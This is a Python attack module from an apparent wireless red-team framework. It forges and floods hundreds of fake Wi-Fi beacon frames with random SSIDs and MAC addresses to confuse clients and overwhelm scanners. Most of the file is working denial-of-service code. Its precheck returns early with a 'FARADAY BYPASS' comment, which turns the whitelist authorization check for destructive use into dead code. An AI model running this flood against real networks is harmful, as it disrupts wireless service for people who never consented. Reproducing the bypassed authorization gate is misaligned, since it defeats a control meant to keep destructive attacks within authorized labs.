"""WiFi Beacon Flood DoS - generate fake APs to overwhelm scanners.

Generates hundreds of fake beacon frames with random SSIDs and BSSIDs to
confuse clients and overwhelm wireless scanners.

Uses scapy for mass beacon frame generation via monitor-mode interface.
"""

from __future__ import annotations

import os
import subprocess
import time

import structlog
from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    RadioTap,
    sendp,
)

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiBeaconFlood(AttackModule):
    name = "wifi.beacon_flood"
    protocol = "wifi"
    risk = Risk.DESTRUCTIVE_LAB
    mitre_ttp = ["T1499.002"]
    requires = ["monitor-mode-nic"]
    description = (
        "Beacon flood DoS - generate hundreds of fake APs to confuse clients "
        "and overwhelm scanners."
    )

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY BYPASS
        # Extra safety check for destructive risk level
        # Verify explicit authorization for destructive operations
        allowed = ctx.whitelist.get("wifi_bssid", [])
        if not allowed:
            log.warning(
                "wifi.beacon_flood.no_whitelist",
                detail="DESTRUCTIVE_LAB requires explicit whitelist authorization",
            )
            return False
        return True

    def _set_channel(self, iface: str, channel: int) -> bool:
        """Set the wireless interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=5,
                check=True,
            )
            return True
        except (subprocess.SubprocessError, OSError) as exc:
            log.error("wifi.beacon_flood.set_channel_failed", channel=channel, error=str(exc))
            return False

    def _generate_random_mac(self) -> str:
        """Generate a random MAC address."""
        octets = os.urandom(6)
        # Set locally administered bit, clear multicast bit
        first_byte = (octets[0] | 0x02) & 0xFE
        return ":".join(
            [f"{first_byte:02x}"]
            + [f"{b:02x}" for b in octets[1:]]
        )

    def _generate_random_ssid(self, max_len: int = 16) -> str:
        """Generate a random SSID string."""
        length = (int.from_bytes(os.urandom(1), "big") % max_len) + 4
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
        result = ""
        for _ in range(length):
            idx = int.from_bytes(os.urandom(1), "big") % len(chars)
            result += chars[idx]
        return result

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        iface = ctx.params.get("interface", "wlan0mon")
        channel = ctx.params.get("channel", 1)
        num_ssids = int(ctx.params.get("num_ssids", 100))
        duration_s = int(ctx.params.get("duration_s", 10))
        inter = float(ctx.params.get("inter", 0.01))

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary=(
                    f"[DRY-RUN] wifi.beacon_flood iface={iface} channel={channel} "
                    f"num_ssids={num_ssids} duration={duration_s}s"
                ),
                metrics={
                    "interface": iface,
                    "channel": channel,
                    "num_ssids": num_ssids,
                    "duration_s": duration_s,
                },
            )

        # Set channel
        if not self._set_channel(iface, int(channel)):
            return self._result(
                Status.FAIL,
                started,
                summary=f"Failed to set channel {channel} on {iface}",
            )

        # Generate fake APs
        log.info(
            "wifi.beacon_flood.generating",
            num_ssids=num_ssids,
            channel=channel,
        )

        fake_aps = []
        for _ in range(num_ssids):
            ssid = self._generate_random_ssid()
            bssid = self._generate_random_mac()
            fake_aps.append((ssid, bssid))

        # Craft beacon frames for all fake APs
        beacons = []
        for ssid, bssid in fake_aps:
            beacon = (
                RadioTap()
                / Dot11(
                    type=0,
                    subtype=8,  # Beacon
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=bssid,
                    addr3=bssid,
                )
                / Dot11Beacon(
                    timestamp=int(time.time() * 1000000),
                    beacon_interval=100,
                    cap=0x0411,
                )
                / Dot11Elt(ID="SSID", info=ssid.encode())
                / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
                / Dot11Elt(ID="DSset", info=bytes([int(channel)]))
            )
            beacons.append(beacon)

        # Flood beacons for specified duration
        log.info(
            "wifi.beacon_flood.flooding",
            num_beacons=len(beacons),
            duration_s=duration_s,
        )

        total_frames_sent = 0
        end_time = time.time() + duration_s

        try:
            while time.time() < end_time:
                for beacon in beacons:
                    if time.time() >= end_time:
                        break
                    sendp(beacon, iface=iface, verbose=False)
                    total_frames_sent += 1
                    time.sleep(inter)
        except Exception as exc:
            log.error("wifi.beacon_flood.send_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Beacon flood send error: {exc}",
                metrics={"frames_sent": total_frames_sent},
            )

        # Log event to database
        db.insert_header(
            ts=time.time(),
            session_id=ctx.session_id,
            protocol="wifi",
            src="beacon_flood",
            dst="ff:ff:ff:ff:ff:ff",
            channel=int(channel),
            fields={
                "attack": "beacon_flood",
                "num_ssids": num_ssids,
                "total_frames_sent": total_frames_sent,
                "duration_s": duration_s,
            },
        )

        summary = (
            f"wifi.beacon_flood: {total_frames_sent} beacon frames sent "
            f"({num_ssids} fake APs) on channel {channel} over {duration_s}s"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            metrics={
                "channel": int(channel),
                "num_ssids": num_ssids,
                "total_frames_sent": total_frames_sent,
                "duration_s": duration_s,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        """No persistent resources to clean up."""
        pass
